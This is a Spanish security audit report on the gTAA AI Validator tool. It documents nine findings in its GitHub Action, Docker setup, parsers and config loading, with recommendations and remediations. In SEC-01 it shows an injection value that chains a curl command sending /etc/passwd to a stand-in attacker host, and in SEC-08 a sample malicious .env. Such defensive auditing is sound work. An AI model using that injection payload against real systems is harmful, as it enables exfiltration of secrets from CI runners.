# Fase 10 — Auditoría de Seguridad del Código

## Resumen Ejecutivo

Este documento recoge los resultados de una auditoría de seguridad realizada sobre el código fuente
del proyecto gTAA AI Validator (v0.10.4). La auditoría se ejecutó de forma estática sobre todas las
capas del proyecto: CLI, analizadores, checkers, reportes, capa LLM, parsers, Docker y GitHub Actions.

Se identificaron **9 hallazgos** clasificados por severidad:

| Severidad | Cantidad | Estado |
|-----------|----------|--------|
| CRITICA   | 2        | **Remediado** |
| ALTA      | 4        | **Remediado** |
| MEDIA     | 3        | **Remediado** |
| **Total** | **9**    | **9/9 Remediados** |

Adicionalmente, se documentan las **buenas prácticas de seguridad** ya implementadas en el proyecto.

---

## Metodología

La auditoría se realizó mediante análisis estático del código fuente cubriendo las siguientes categorías
del OWASP Top 10 y mejores prácticas de seguridad en aplicaciones:

- **Inyección** (command injection, SQL injection, code injection)
- **Path traversal** y manipulación de rutas
- **Deserialización insegura** (YAML, JSON)
- **Denegación de servicio** (DoS) por consumo de recursos
- **Cross-Site Scripting** (XSS) en reportes HTML
- **Gestión de secretos** (API keys, credenciales)
- **Divulgación de información** (rutas absolutas, logs)
- **Expresiones regulares** (ReDoS)
- **Seguridad de contenedores** (Docker)
- **Seguridad de CI/CD** (GitHub Actions, supply chain)

---

## Hallazgos

### SEC-01 — Inyección de comandos en GitHub Action [CRITICA]

**Fichero**: `action.yml:90`

**Descripción**: El archivo `action.yml` utiliza `eval $CMD` para ejecutar el comando del validador.
La variable `$CMD` se construye concatenando inputs del usuario (`project_path`, `provider`,
`config_path`) sin sanitización. Un repositorio malicioso podría inyectar comandos shell arbitrarios
a través de estos inputs.

**Código afectado**:
```yaml
# action.yml:67-90
CMD="gtaa-validator ${{ inputs.project_path }}"
CMD="$CMD --json gtaa_report.json --html gtaa_report.html"
# ...
if [ -n "${{ inputs.provider }}" ]; then
  CMD="$CMD --provider ${{ inputs.provider }}"
fi
# ...
eval $CMD    # ← INYECCIÓN DE COMANDOS
```

**Vector de ataque**: Un usuario podría pasar como `project_path` un valor como
`./tests; curl http://atacante.com/exfil?data=$(cat /etc/passwd)` y el `eval` lo ejecutaría.

**Riesgo**: Ejecución arbitraria de código en el runner de GitHub Actions. Potencial exfiltración
de secretos del workflow (`GEMINI_API_KEY`, tokens de GitHub, etc.).

**Recomendación**: Eliminar `eval` y ejecutar el comando directamente con argumentos posicionales,
o usar un array de bash:
```yaml
# Opción segura: ejecutar directamente sin eval
gtaa-validator "${{ inputs.project_path }}" \
  --json gtaa_report.json \
  --html gtaa_report.html
```

**Clasificación OWASP**: A03:2021 — Injection

**Estado**: ✅ **REMEDIADO**

**Remediación aplicada**: Se eliminó `eval $CMD` y se reemplazó con un array de bash
(`ARGS=()`) que construye los argumentos de forma segura. El comando se ejecuta
directamente como `gtaa-validator "${ARGS[@]}"`, previniendo inyección de comandos
a través de los inputs de la Action.

---

### SEC-02 — API key potencialmente en historial de Git [CRITICA]

**Fichero**: `.env` (si fue commiteado en algún momento)

**Descripción**: El proyecto utiliza archivos `.env` para almacenar la API key de Gemini
(`GEMINI_API_KEY`). Si en algún momento un `.env` con la key real fue commiteado al repositorio,
la key permanece en el historial de Git incluso si el archivo fue eliminado posteriormente.

**Mitigaciones existentes**:
- El archivo `.gitignore` incluye `.env` (verificado)
- El `.dockerignore` también excluye `.env`
- Se distribuye `.env.example` con valores placeholder

**Riesgo**: Si la key fue commiteada, cualquier persona con acceso al repositorio puede
recuperarla con `git log --all --full-history -- .env`.

**Recomendación**:
1. Verificar historial: `git log --all --full-history -- .env`
2. Si aparece algún commit, rotar la API key inmediatamente
3. Considerar usar `git-secrets` o `truffleHog` como pre-commit hook
4. Documentar en CONTRIBUTING.md que nunca se deben commitear archivos `.env`

**Clasificación OWASP**: A07:2021 — Identification and Authentication Failures

**Estado**: ✅ **VERIFICADO — Sin riesgo**

**Remediación aplicada**: Se verificó el historial de Git con `git log --all --full-history -- .env`
y se confirmó que **nunca se commiteó un archivo `.env`** al repositorio. Las protecciones
existentes (`.gitignore`, `.dockerignore`) son suficientes. No requiere acción adicional.

---

### SEC-03 — Rutas absolutas expuestas en reportes [ALTA]

**Fichero**: `gtaa_validator/models.py:346, 449`

**Descripción**: Los métodos `to_dict()` de los modelos `Violation` y `Report` serializan las rutas
de archivos como rutas absolutas del sistema usando `str(self.file_path)` y `str(self.project_path)`.
Esto incluye la ruta completa del sistema de archivos del usuario en los reportes JSON y HTML.

**Código afectado**:
```python
# models.py:346
"file": str(self.file_path),

# models.py:449
"project_path": str(self.project_path),
```

**Ejemplo de información expuesta**:
```json
{
  "project_path": "/home/usuario/proyectos/mi-app/tests",
  "file": "/home/usuario/proyectos/mi-app/tests/test_login.py"
}
```

**Riesgo**: Divulgación de información sobre la estructura del sistema de archivos del usuario.
En reportes compartidos o subidos como artefactos de CI, esto revela nombres de usuario,
estructura de directorios y posiblemente información sensible en nombres de carpetas.

**Recomendación**: Convertir las rutas a relativas respecto al `project_path` antes de serializar:
```python
"file": str(self.file_path.relative_to(self.project_path.parent)),
```

**Clasificación OWASP**: A01:2021 — Broken Access Control (Information Disclosure)

**Estado**: ✅ **REMEDIADO**

**Remediación aplicada**: Se modificó `Violation.to_dict()` para aceptar un parámetro
opcional `project_path` y relativizar las rutas de archivos. `Report.to_dict()` ahora
usa `self.project_path.name` (solo el nombre del directorio) en lugar de la ruta absoluta
completa, y pasa `project_path` a cada violation para relativizar sus rutas.

---

### SEC-04 — API key podría filtrarse en logs de DEBUG [ALTA]

**Fichero**: `gtaa_validator/llm/factory.py`, `gtaa_validator/llm/api_client.py`

**Descripción**: El sistema de logging del proyecto registra información sobre la configuración
del cliente LLM. Aunque actualmente no se loguea la API key directamente, el nivel DEBUG podría
capturar la key en ciertos escenarios:

1. Logs de librerías externas (google-genai SDK) que podrían incluir headers HTTP con la key
2. Tracebacks completos en excepciones que incluyan el objeto `APILLMClient` con la key en memoria
3. Logs futuros que inadvertidamente incluyan la key al loguear configuración

**Riesgo**: Si los logs se almacenan en archivos (activado con `--verbose`) o se suben como
artefactos de CI, la API key podría quedar expuesta.

**Recomendación**:
1. Asegurar que nunca se loguee `api_key` directamente
2. Implementar un filtro de logging que redacte patrones de API keys (ej: `AIza...`)
3. En `__repr__` de `APILLMClient`, nunca incluir la key
4. Configurar el SDK de google-genai para no loguear headers HTTP

**Clasificación OWASP**: A09:2021 — Security Logging and Monitoring Failures

**Estado**: ✅ **REMEDIADO**

**Remediación aplicada**: Se añadió un método `__repr__` a `APILLMClient` que solo muestra
el nombre del modelo, nunca la API key. Esto previene que la key aparezca en tracebacks
o logs de debug que representen el objeto.

---

### SEC-05 — Sin límite de tamaño en lectura de archivos (DoS) [ALTA]

**Ficheros afectados** (10 ubicaciones):
- `gtaa_validator/analyzers/static_analyzer.py:254` — `source_code = f.read()`
- `gtaa_validator/parsers/python_parser.py:82` — `source = f.read()`
- `gtaa_validator/parsers/treesitter_base.py:158` — `source = f.read()`
- `gtaa_validator/parsers/gherkin_parser.py:182` — `content = f.read()`
- `gtaa_validator/checkers/adaptation_checker.py:146` — `source_code = f.read()`
- `gtaa_validator/checkers/definition_checker.py:177` — `source_code = f.read()`
- `gtaa_validator/checkers/quality_checker.py:140` — `source_code = f.read()`
- `gtaa_validator/checkers/bdd_checker.py:147, 216, 345` — `content/source = f.read()`

**Descripción**: Todas las lecturas de archivos del proyecto usan `f.read()` sin límite de tamaño.
Un proyecto malicioso podría incluir archivos extremadamente grandes (ej: un `.py` de 10 GB generado)
que consumirían toda la memoria disponible del proceso.

**Riesgo**: Denegación de servicio por agotamiento de memoria. Especialmente relevante cuando se
ejecuta como GitHub Action donde los runners tienen recursos limitados (7 GB RAM).

**Recomendación**: Implementar un límite de tamaño máximo por archivo:
```python
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB

def _read_file_safe(file_path: Path, max_size: int = MAX_FILE_SIZE) -> str:
    if file_path.stat().st_size > max_size:
        logger.warning(f"Archivo omitido por tamaño: {file_path} ({file_path.stat().st_size} bytes)")
        return ""
    with open(file_path) as f:
        return f.read()
```

**Clasificación OWASP**: No OWASP directo — Denegación de Servicio (DoS)

**Estado**: ✅ **REMEDIADO**

**Remediación aplicada**: Se creó un módulo centralizado `gtaa_validator/file_utils.py` con
la función `read_file_safe()` que impone un límite de 10 MB por archivo. Se actualizaron
las **10 ubicaciones** en 7 ficheros para usar esta función en lugar de `f.read()` directo.
Archivos que excedan el límite se omiten con un warning en el log.

---

### SEC-06 — Contenedor Docker ejecuta como root [ALTA]

**Fichero**: `Dockerfile`

**Descripción**: El `Dockerfile` no incluye una directiva `USER` para cambiar al usuario no-root.
El proceso `gtaa-validator` se ejecuta como `root` dentro del contenedor. Aunque el contenedor
solo analiza código (no lo ejecuta), el principio de mínimo privilegio recomienda un usuario
sin privilegios.

**Código actual**:
```dockerfile
FROM python:3.12-slim
# ... (sin directiva USER)
WORKDIR /project
ENTRYPOINT ["gtaa-validator"]
CMD ["."]
```

**Riesgo**: Si existiera una vulnerabilidad de escape de contenedor, el proceso tendría
privilegios de root en el host. Aunque el riesgo práctico es bajo para esta herramienta
(solo lectura de archivos), es una mala práctica.

**Recomendación**: Añadir un usuario sin privilegios:
```dockerfile
RUN useradd --create-home --shell /bin/bash validator
USER validator
WORKDIR /project
```

**Nota**: Esto requiere que el volumen montado (`-v`) tenga permisos de lectura para el usuario
`validator`, lo cual podría requerir ajustes en el `docker run`.

**Clasificación**: CIS Docker Benchmark — 4.1 (Ensure a user for the container has been created)

**Estado**: ✅ **REMEDIADO**

**Remediación aplicada**: Se añadió `RUN useradd --create-home --shell /bin/bash validator`
y `USER validator` al `Dockerfile`. El proceso ahora se ejecuta como usuario `validator`
sin privilegios de root.

---

### SEC-07 — Riesgo de ReDoS en patrones de BDDChecker [MEDIA]

**Fichero**: `gtaa_validator/checkers/bdd_checker.py:50-51`

**Descripción**: Dos expresiones regulares en `BDDChecker` podrían ser vulnerables a
ataques de denegación de servicio por expresiones regulares (ReDoS):

**Código afectado**:
```python
# bdd_checker.py:50-51
re.compile(r'https?://\S+'),                    # URLs
re.compile(r'SELECT\s+.+\s+FROM', re.IGNORECASE),  # SQL
```

**Análisis**:
- `r'https?://\S+'` — El cuantificador `\S+` es greedy y podría causar backtracking en strings
  con muchos caracteres seguidos de un espacio final. Riesgo: **bajo**.
- `r'SELECT\s+.+\s+FROM'` — La combinación `.+\s+` es potencialmente problemática. El `.+`
  greedy captura todo y luego hace backtracking para encontrar `\s+FROM`. Con input
  malicioso (`SELECT` + miles de caracteres sin `FROM`) el backtracking es lineal, no
  exponencial. Riesgo: **bajo-medio**.

**Riesgo**: En la práctica, estos patrones se aplican sobre líneas individuales de archivos
`.feature` (Gherkin), que son típicamente cortos. El riesgo real es bajo, pero en un contexto
de análisis de proyectos no confiables, conviene ser defensivo.

**Recomendación**: Usar cuantificadores posesivos o atómicos si el motor lo soporta, o limitar
la longitud del input:
```python
re.compile(r'https?://\S{1,2000}'),              # URLs con límite
re.compile(r'SELECT\s+.{1,500}\s+FROM', re.IGNORECASE),  # SQL con límite
```

**Clasificación OWASP**: No OWASP directo — ReDoS (Regular Expression Denial of Service)

**Estado**: ✅ **REMEDIADO**

**Remediación aplicada**: Se añadieron límites de longitud a los cuantificadores de las
dos regex vulnerables: `\S+` → `\S{1,2000}` para URLs y `.+` → `.{1,500}` para SQL.
Esto limita el backtracking a un máximo controlado.

---

### SEC-08 — load_dotenv() carga desde directorio de trabajo [MEDIA]

**Fichero**: `gtaa_validator/__main__.py:21`

**Descripción**: La función `load_dotenv()` se ejecuta al inicio del CLI sin especificar una
ruta explícita. Esto carga variables de entorno desde el archivo `.env` del directorio de
trabajo actual (CWD), que es el directorio del proyecto que se está analizando.

**Código afectado**:
```python
# __main__.py:19-21
from dotenv import load_dotenv

load_dotenv()
```

**Vector de ataque**: Un proyecto malicioso podría incluir un archivo `.env` con contenido
que sobrescribe variables de entorno del proceso:
```bash
# .env malicioso en el proyecto analizado
PATH=/usr/bin:/tmp/malicious
HOME=/tmp
GEMINI_API_KEY=key-del-atacante  # Redirigir llamadas API
```

**Riesgo**: Un proyecto no confiable podría manipular la configuración del validador. El riesgo
más relevante es redirigir las llamadas API a un endpoint controlado por el atacante mediante
una API key propia. Riesgo práctico: **medio-bajo** (requiere que el usuario ejecute `--ai`
sin tener configurada su propia key).

**Recomendación**: Cargar `.env` explícitamente desde el directorio home del usuario o desde
la ubicación del paquete, no desde el CWD:
```python
from pathlib import Path
load_dotenv(Path.home() / ".env")
# o
load_dotenv(Path(__file__).parent.parent / ".env")
```

**Clasificación OWASP**: A05:2021 — Security Misconfiguration

**Estado**: ✅ **REMEDIADO**

**Remediación aplicada**: Se modificó `load_dotenv()` para cargar explícitamente desde
el directorio del paquete (`Path(__file__).resolve().parent.parent / ".env"`) y desde
el directorio home del usuario (`Path.home() / ".env"`), eliminando la carga desde el CWD.

---

### SEC-09 — GitHub Actions sin pinning por SHA [MEDIA]

**Fichero**: `.github/workflows/ci.yml` y `action.yml`

**Descripción**: Las acciones de GitHub referenciadas en los workflows usan tags de versión
(`@v4`, `@v5`) en lugar de hashes SHA completos. Esto expone al proyecto a ataques de
supply chain si una de estas acciones es comprometida.

**Código afectado**:
```yaml
# ci.yml
- uses: actions/checkout@v4        # ← Sin SHA
- uses: actions/setup-python@v5    # ← Sin SHA

# action.yml
- uses: actions/setup-python@v5    # ← Sin SHA
- uses: actions/upload-artifact@v4 # ← Sin SHA
```

**Vector de ataque**: Si un atacante compromete el repositorio `actions/checkout` y modifica
el tag `v4` para apuntar a código malicioso, todos los workflows que usen `@v4` ejecutarían
código del atacante.

**Riesgo**: Supply chain attack. Riesgo práctico: **bajo** (las acciones oficiales de GitHub
tienen protecciones adicionales), pero es una buena práctica de seguridad usar SHA pinning.

**Recomendación**: Usar SHA completos con comentario de versión:
```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
- uses: actions/setup-python@65d7f2d534ac1bc67fcd62888c5f4f3d2cb2b236 # v5.1.0
- uses: actions/upload-artifact@5d5d22a31266ced268874388b861e4b58bb5c2f3 # v4.3.1
```

**Clasificación**: SLSA Supply Chain — Pinned Dependencies

**Estado**: ✅ **REMEDIADO**

**Remediación aplicada**: Se fijaron las 4 referencias de acciones a hashes SHA completos
con comentario de versión:
- `actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5` (v4.3.1)
- `actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065` (v5.6.0)
- `actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02` (v4.6.2)

---

## Buenas Prácticas de Seguridad Existentes

El proyecto ya implementa varias buenas prácticas de seguridad que merecen reconocimiento:

### Prevención XSS en reportes HTML

El `HtmlReporter` usa consistentemente `html.escape()` en **10+ ubicaciones** para sanitizar
todo el contenido dinámico antes de insertarlo en el HTML:

```python
# html_reporter.py — ejemplos
html.escape(str(report.project_path.name))   # Nombre del proyecto
html.escape(vtype.get_description())          # Descripción de violación
html.escape(v.message)                        # Mensaje de violación
html.escape(v.code_snippet)                   # Fragmento de código
html.escape(v.ai_suggestion)                  # Sugerencia de IA
html.escape(v.recommendation)                 # Recomendación
```

Esto previene ataques XSS donde código malicioso en nombres de archivos o contenido de código
podría ejecutar JavaScript en el navegador al abrir el reporte HTML.

### Deserialización segura de YAML

El proyecto usa `yaml.safe_load()` en lugar de `yaml.load()` para leer archivos `.gtaa.yaml`,
previniendo ataques de deserialización arbitraria de objetos Python:

```python
# config.py
config_data = yaml.safe_load(f)  # ← Seguro: solo tipos básicos
```

### Ausencia de eval/exec en código Python

El código Python del validador no contiene ninguna llamada a `eval()` o `exec()`, eliminando
vectores de inyección de código a nivel de aplicación. (El uso de `eval` se limita al shell
script en `action.yml`, documentado en SEC-01.)

### Manejo de errores sin exposición de información

Las excepciones en la capa LLM se manejan con degradación elegante, sin exponer tracebacks
al usuario final:

```python
# semantic_analyzer.py
except Exception:
    logger.debug("Error en análisis semántico", exc_info=True)
    # Continúa sin AI — no se expone el error al usuario
```

### Variables de entorno para secretos

La API key nunca se pasa como argumento de CLI (que aparecería en `ps aux`), sino como
variable de entorno:

```bash
# Correcto: variable de entorno
export GEMINI_API_KEY=mi-key
gtaa-validator proyecto/ --ai

# Incorrecto (NO implementado): argumento CLI
gtaa-validator proyecto/ --ai --api-key=mi-key  # ← No existe
```

### .gitignore y .dockerignore protegen secretos

Ambos archivos de exclusión incluyen `.env`, `.env.*`, archivos de log y directorios
sensibles, previniendo la inclusión accidental de secretos en el repositorio o imagen Docker.

---

## Matriz de Riesgo

```
                    IMPACTO
                    Bajo         Medio        Alto         Critico
                ┌────────────┬────────────┬────────────┬────────────┐
  Probable      │            │ SEC-08     │ SEC-05     │ SEC-01     │
                │            │            │            │            │
                ├────────────┼────────────┼────────────┼────────────┤
  Posible       │            │ SEC-07     │ SEC-03     │ SEC-02     │
                │            │ SEC-09     │ SEC-04     │            │
                ├────────────┼────────────┼────────────┼────────────┤
PROBABILIDAD    │            │            │ SEC-06     │            │
  Improbable    │            │            │            │            │
                │            │            │            │            │
                └────────────┴────────────┴────────────┴────────────┘
```

---

## Tabla Resumen de Hallazgos

| ID     | Severidad | Hallazgo                                    | Fichero(s)                          | OWASP / Estándar          | Estado          |
|--------|-----------|---------------------------------------------|-------------------------------------|---------------------------|-----------------|
| SEC-01 | CRITICA   | Inyección de comandos (`eval $CMD`)         | `action.yml`                        | A03:2021 Injection        | ✅ Remediado    |
| SEC-02 | CRITICA   | API key en historial de Git                 | `.env` (historial)                  | A07:2021 Auth Failures    | ✅ Verificado   |
| SEC-03 | ALTA      | Rutas absolutas en reportes                 | `models.py`                         | A01:2021 Access Control   | ✅ Remediado    |
| SEC-04 | ALTA      | API key filtrable en logs DEBUG             | `llm/api_client.py`                 | A09:2021 Logging          | ✅ Remediado    |
| SEC-05 | ALTA      | Sin límite de tamaño en `f.read()`          | 10 ficheros → `file_utils.py`       | DoS                       | ✅ Remediado    |
| SEC-06 | ALTA      | Docker ejecuta como root                    | `Dockerfile`                        | CIS Docker 4.1            | ✅ Remediado    |
| SEC-07 | MEDIA     | Riesgo ReDoS en regex                       | `bdd_checker.py`                    | ReDoS                     | ✅ Remediado    |
| SEC-08 | MEDIA     | `load_dotenv()` carga desde CWD             | `__main__.py`                       | A05:2021 Misconfig        | ✅ Remediado    |
| SEC-09 | MEDIA     | Actions sin SHA pinning                     | `ci.yml`, `action.yml`              | SLSA Supply Chain         | ✅ Remediado    |

---

## Conclusiones

El proyecto gTAA AI Validator presenta un nivel de seguridad **bueno** para una herramienta
de análisis estático en el contexto de un TFM. Tras la remediación de los 9 hallazgos
identificados, **todos los problemas de seguridad han sido corregidos o verificados**.

Las buenas prácticas implementadas (XSS prevention, safe YAML, no eval en Python, secrets
via env vars) junto con las correcciones aplicadas demuestran un ciclo completo de
auditoría-remediación-verificación.

### Resumen de remediación

| Acción                                          | Hallazgos    |
|-------------------------------------------------|--------------|
| Código corregido                                | SEC-01, SEC-03, SEC-04, SEC-05, SEC-06, SEC-07, SEC-08, SEC-09 |
| Verificado sin riesgo                           | SEC-02       |
| **Total remediados**                            | **9/9**      |

### Ficheros modificados en la remediación

| Fichero                                        | Hallazgo(s) |
|------------------------------------------------|-------------|
| `action.yml`                                   | SEC-01, SEC-09 |
| `.github/workflows/ci.yml`                     | SEC-09 |
| `gtaa_validator/models.py`                     | SEC-03 |
| `gtaa_validator/llm/api_client.py`             | SEC-04 |
| `gtaa_validator/file_utils.py` (nuevo)         | SEC-05 |
| `gtaa_validator/analyzers/static_analyzer.py`  | SEC-05 |
| `gtaa_validator/parsers/python_parser.py`      | SEC-05 |
| `gtaa_validator/parsers/treesitter_base.py`    | SEC-05 |
| `gtaa_validator/parsers/gherkin_parser.py`     | SEC-05 |
| `gtaa_validator/checkers/adaptation_checker.py`| SEC-05 |
| `gtaa_validator/checkers/definition_checker.py`| SEC-05 |
| `gtaa_validator/checkers/quality_checker.py`   | SEC-05 |
| `gtaa_validator/checkers/bdd_checker.py`       | SEC-05, SEC-07 |
| `Dockerfile`                                   | SEC-06 |
| `gtaa_validator/__main__.py`                   | SEC-08 |
| `tests/unit/test_models.py`                    | (adaptación de test para SEC-03) |

**Verificación**: 416 tests pasando tras la remediación (0 fallos). *Nota: Tras las Fases 10.5-10.9, el total actual es 761 tests.*

---

**Fecha de auditoría**: 6 de febrero de 2026
**Fecha de remediación**: 6 de febrero de 2026
**Versión auditada**: 0.10.4
**Auditor**: Análisis estático automatizado + revisión manual
**Herramientas**: Revisión de código fuente (grep, AST), análisis de Dockerfile, análisis de workflows
